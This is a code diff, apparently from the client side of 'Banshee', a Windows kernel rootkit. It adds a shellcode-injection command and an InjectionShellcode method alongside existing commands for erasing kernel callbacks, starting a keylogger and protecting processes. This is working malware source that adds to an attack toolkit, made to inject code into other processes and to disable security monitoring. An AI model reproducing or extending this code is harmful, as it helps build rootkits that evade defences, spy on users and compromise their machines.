@@ -24,7 +24,8 @@ enum COMMAND_TYPE
     ENUM_CALLBACKS = 5,
     ERASE_CALLBACKS = 6,
     START_KEYLOGGER = 7,
-    UNLOAD = 8
+    INJECTION = 8,
+    UNLOAD = 9
 };
 
 enum CALLBACK_TYPE {
@@ -40,13 +41,16 @@ typedef struct _CALLBACK_DATA {
 } CALLBACK_DATA;
 
 typedef struct _BANSHEE_PAYLOAD {
+    BYTE executed;
+    BYTE newcommand;
     COMMAND_TYPE cmdType;
     ULONG status;
     ULONG ulValue;
     BYTE byteValue;
-    WCHAR wcharString[64];
+    WCHAR wcharString[256];
     CALLBACK_DATA callbackData[32];
 } BANSHEE_PAYLOAD;
+
 
 // --------------------------------------------------------------------------------------------------------
 
@@ -221,6 +225,15 @@ public:
         payload.cmdType = PROTECT_PROCESS;
         payload.ulValue = pid;
         payload.byteValue = newLevel;
+        return SendSimpleCommand((PVOID)&payload);
+    }
+
+    BANSHEE_STATUS InjectionShellcode(CONST DWORD& pid, std::wstring& filePath)
+    {
+        BANSHEE_PAYLOAD payload;
+        payload.cmdType = INJECTION;
+        payload.ulValue = pid;
+        wcsncpy_s(payload.wcharString, filePath.c_str(), _countof(payload.wcharString) - 1);
         return SendSimpleCommand((PVOID)&payload);
     }
 
